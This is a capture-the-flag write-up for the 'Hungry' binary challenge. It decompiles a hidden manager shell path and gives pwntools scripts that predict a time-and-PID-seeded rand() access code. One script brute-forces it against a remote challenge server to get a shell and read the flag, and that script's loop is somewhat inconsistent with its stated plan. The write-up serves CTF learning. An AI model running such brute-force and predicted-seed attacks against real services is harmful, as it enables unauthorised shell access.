# Hungry

Was provided with a 64 bit ELF called `burgers_are_mid`. 

Checksec output: 

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

`PIE` is disabled, so the addresses remain constant and do not change with each run. 

Next step would be to decompile the binary to get an idea what the actual code might be. 

After decompilation, these are the functions which are important: 

```
manager_control_panel
grilled
fried
take_order
choose_style
main 
```

After further inspection, we can see that the function `manager_control_panel` needs to be exploited to get access to the shell, from which we can `cat` out the flag. 

Decompilation of the `manager_control_panel`: 

```c
unsigned __int64 manager_control_panel()
{
  int v0; // ebx
  __pid_t v1; // eax
  int v3; // [rsp+0h] [rbp-20h] BYREF
  int v4; // [rsp+4h] [rbp-1Ch]
  unsigned __int64 v5; // [rsp+8h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  v0 = time(0);
  v1 = getpid();
  srand(v0 ^ v1);
  v4 = rand() % 1000000;
  printf("Enter manager access code: ");
  __isoc99_scanf("%d", &v3);
  if ( v4 != v3 )
  {
    puts("Incorrect code. Get back to work, frycook!");
    exit(0);
  }
  puts("Access granted, starting management interface.");
  execl("/bin/bash", "/bin/bash", 0); // this will give us access to the shell
  return v5 - __readfsqword(0x28u);
}
```

This is the flow of control: 

`main` -> `take_order` -> `choose_style` -> `grilled/fried`

We need to somehow run the function `manager_control_panel`

The `main` function contains `take_order` and `choose_style`, so lets check `take_order` as it is run first. 

Decompilation of `take_order` function: 

```c
unsigned __int64 take_order()
{
  unsigned __int8 v1; // [rsp+7h] [rbp-19h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-18h]
  unsigned __int64 i; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v2 = 0;
  puts("What would you like on your Bit Burger?");
  for ( i = 0; i <= 0x17; ++i ) // (i = 0; i <= 23; ++i)
  {
    printf(" - %s (y/n)? ", (&ingredients)[i]);
    __isoc99_scanf("%c%*c", &v1);
    if ( v1 == 36 )
      manager_control_panel(); // here we can see manager_control_panel is run
    if ( v1 != 121 && v1 != 110 )
      printf("I'm not sure what '%c' means. Goodbye!\n", v1);
    if ( v1 == 121 )
      v2 |= 1 << i;
  }
  printf("\nGot it! One Bit Burger with ");
  for ( i = 0; i <= 0x17; ++i )
  {
    if ( (v2 & (1 << i)) != 0 )
      printf("%s, ", (&ingredients)[i]);
  }
  puts("comin' right up!\n");
  return v4 - __readfsqword(0x28u);
}

```

From the above code, we can infer that, if `v1 == 36`, then it will run the function `manager_control_panel`.  

`v1` will be 36 if the ASCII value of the character is 36. 

ASCII value of `$` is 36, so lets input that and take a look at what output we get. 


```
> ./burgers_are_mid

Welcome to BitBurger, home of the Bit Burger! May I take your order?

What would you like on your Bit Burger?
 - a bun (y/n)? $
Enter manager access code: laksdjflkasjdf
Incorrect code. Get back to work, frycook!
```

As we can see, we need manager access code to access the shell. 
Next step would be to analyse the function `manager_control_panel`. 

```c
unsigned __int64 manager_control_panel()
{
  int v0; // ebx
  __pid_t v1; // eax
  int v3; // [rsp+0h] [rbp-20h] BYREF
  int v4; // [rsp+4h] [rbp-1Ch]
  unsigned __int64 v5; // [rsp+8h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  v0 = time(0);
  v1 = getpid();
  srand(v0 ^ v1);
  v4 = rand() % 1000000;
  printf("Enter manager access code: ");
  __isoc99_scanf("%d", &v3);
  if ( v4 != v3 )
  {
    puts("Incorrect code. Get back to work, frycook!");
    exit(0);
  }
  puts("Access granted, starting management interface.");
  execl("/bin/bash", "/bin/bash", 0); // this will give us access to the shell
  return v5 - __readfsqword(0x28u);
}
```


The function compares `v4` to `v3`, if they are not equal, it will just exit. 

This is the part, which makes the manager access code: 

```c
v5 = __readfsqword(0x28u);
v0 = time(0);
v1 = getpid();
srand(v0 ^ v1);
v4 = rand() % 1000000;
```

This is what's happening: 
- Current unix time is stored in v0
- Process ID of the program is stored in v1
- v0 and v1 are XORed and seeded for the `rand` function
- The random number is stored in v4 after undergoing modulo operation with 1000000

Lets write a script to mimic what's happening in the given function: 

local_solve.py:  
```python
from pwn import * 
import time
from ctypes import CDLL
from ctypes.util import find_library

libc = CDLL(find_library("c"))


ELF('./burgers_are_mid')

p = process('./burgers_are_mid')

print(p.recv())
p.sendline(b'$')

time_now = int(time.time())
process_pid = p.pid 

seed = time_now ^ process_pid 

libc.srand(seed)

access_code = libc.rand() % 1000000

print(p.recv())

p.sendline(bytes(str(access_code), 'ascii'))

p.interactive()

```

Output: 
```
[*] '/home/haard/Documents/recruitment/haard_phase2/binex/hungry/src/burgers_are_mid'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process './burgers_are_mid': pid 68233
b'\nWelcome to BitBurger, home of the Bit Burger! May I take your order?\n\nWhat would you like on your Bit Burger?\n - a bun (y/n)? '
b'Enter manager access code: '
[*] Switching to interactive mode
Access granted, starting management interface.
$ ls
burgers_are_mid      burgers_are_mid.nam  flag.txt      temp.c
burgers_are_mid.id0  burgers_are_mid.til  pseudocode.c
burgers_are_mid.id1  docker-compose.yml   script.py
burgers_are_mid.id2  Dockerfile           temp
$ cat flag.txt
nite{fake_flag}
```

Now, we have solved this challenge locally. 

The problem with running this script to the remote server is that we don't have the process ID of the program as we don't have access to the server.

Also, we need to assume the Current Unix Time for the server, if the server is not in the same timezone, then it becomes extremely hard to get the seed. 

For 64 bit systems, the max PID is `4194304`. Considering the ELF is 64 bit, I am assuming the server architecture to be also 64 bit. 

Plan of action: 
-> Bruteforce all PIDs and assume that the server is in the same timezone with Â± 5 seconds difference.  

solve.py:
```python
from pwn import * 
import time 
from ctypes import CDLL
from ctypes.util import find_library
import random

libc = CDLL(find_library("c"))

time_now = int(time.time())

for i in range(time_now+5, time_now+6): # assuming server to be in same timezone
    for j in range(0, 4194305): # checking all PIDs 
        seed = i ^ j 
        libc.srand(seed)
        access_code = libc.rand() % 1000000

        p = remote('hunger.nitephase.live', 53791)

        p.sendline(b'$')

        p.sendline(bytes(str(access_code), 'ascii'))
        
        if b'Incorrect' in p.recv():
           p.close() 
        elif b'Access' in p.recv():
           p.interactive()
           break        
```

Output: 
```
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[+] Opening connection to hunger.nitephase.live on port 53791: Done
[*] Switching to interactive mode
$ ls
flag.txt
run
$ cat flag.txt
nite{s1ndh1_15_m0r3_f1ll1ng_th4n_bk_or_mcd}
```

**flag:** `nite{s1ndh1_15_m0r3_f1ll1ng_th4n_bk_or_mcd}`

References: 
- https://stackoverflow.com/questions/3539398/how-does-rand-work-does-it-have-certain-tendencies-is-there-something-better
- https://stackoverflow.com/questions/75535673/how-to-mimic-rand-function-of-c-in-python

Notes: 
- Seeding a random number generator means giving it an initial value (seed) that determines the sequence of pseudo-random numbers it will generate. Using different seeds produces different sequences; using the same seed produces the same sequence.
